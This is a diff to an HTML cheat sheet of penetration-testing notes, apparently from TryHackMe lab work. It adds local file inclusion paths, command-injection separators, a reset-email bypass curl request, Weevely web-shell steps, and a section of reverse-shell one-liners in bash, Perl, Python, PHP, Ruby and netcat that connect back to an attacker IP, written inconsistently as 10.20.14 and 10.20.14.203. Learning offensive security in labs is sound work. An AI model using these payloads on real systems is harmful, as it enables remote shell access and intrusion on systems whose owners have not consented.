@@ -75,7 +75,7 @@
         <ol>dirb ---- dirb url wordlist</ol>
     </div>
 
-    <!--        subdomain finding section start from here       -->
+    <!--        subdomain finding section       -->
 <div>
   <h2><li>Subdomain Enumeration / Subdomain Finding</li></h2>
   <p><b>Brute Force</b></p>
@@ -86,8 +86,9 @@
   <p><b>OSINT</b></p>
   <ol>Open subdomain SSL log: <a href="https://crt.sh" target="_blank">https://crt.sh</a> and <a href="https://ui.ctsearch.entrust.com/ui/ctsearchui" target="_blank">https://ui.ctsearch.entrust.com/ui/ctsearchui</a></ol>
   <ol>Google dork: -site:www.tryhackme.com  site:*.tryhackme.com</ol>
-  
   </div>
+              <!--  information gathering section end here    -->
+              <!--  Vulnerability Finding section start from here    -->
 
   <br><br><h1 style="text-align: center;text-decoration: underline;">Vulnerability Finding</h1>
   <div>
@@ -100,11 +101,31 @@
     </ol>
     <p><b>Bypassing reset email vulnability</b></p>
     curl 'http://10.10.109.51/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
+    
     <h2><li>IDOR vulnerabilities</li></h2>
-    IDOR vulnerabilities: change url info and see it vulnerable or not. url maybe encoded(base64) or hashed. if not found in url, check in network tab.
+    IDOR vulnerabilities: change url info (like http://online-service.thm/profile?user_id=1305, change id value) and see it vulnerable or not. url maybe encoded(base64) or hashed. if not found in url, check in network tab.
+    
+    <h2><li>Local File Inclusion (LFI)</li></h2>
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png">
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png">
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png">
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" font-size:1rem;width:833.25px;height:413.467px>
+
+     <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
+     <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
+     <br><br>
+     Normally this cause happend for file_get_contents PHP fuction.
+
+    <h2><li>Remote code execution vulnerability</li></h2>
+    <p>If website allow to execute code with their allow code like[their_code;attacker_code] then this vulnerability exist. <br>
+    mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
+
+    <h2><li>File upload vulnerability</li></h2>
+    <p> If website allow to upload any kind file like .php, .python then this vulnerability exist</p>
+    
   </div>
-
-
+            <!--  Vulnerability Finding section end here    -->
+              <!--  Exploitation section start from here    -->
   <br><br><h1 style="text-align: center;text-decoration: underline;">Exploitation</h1>
   <div>
     <h2><li>File upload vulnerability exploit</li></h2>
@@ -112,7 +133,29 @@
     <ol>Generate php shell >> weevly generate [password] [file_name]</ol>
     <ol>Connect with shell >> weevly [url to file] [password]</ol>
 
-
+  <!--        Remote code execution exploit       -->
+    <h2><li>Remote code execution exploit[RCE]</li></h2>
+    <p>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>
+    in all f these cases you need to listen for port 8080 using the foolowing command: <b>nc -vv -l -p 8080</b>
+<br><br>
+<b>BASH</b><br>
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1 <br><br>
+<b>PERL</b><br>
+perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+<br><br>
+<b>Python</b><br>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+<br><br>
+<b>PHP</b><br>
+php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+<br><br>
+<b>Ruby</b><br>
+ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+<br><br>
+<b>Netcat</b><br>
+nc -e /bin/sh 10.20.14 8080<br>
+    </p>
   </div>
+   <!-- Exploitation section end here    -->
 </body>
 </html>           
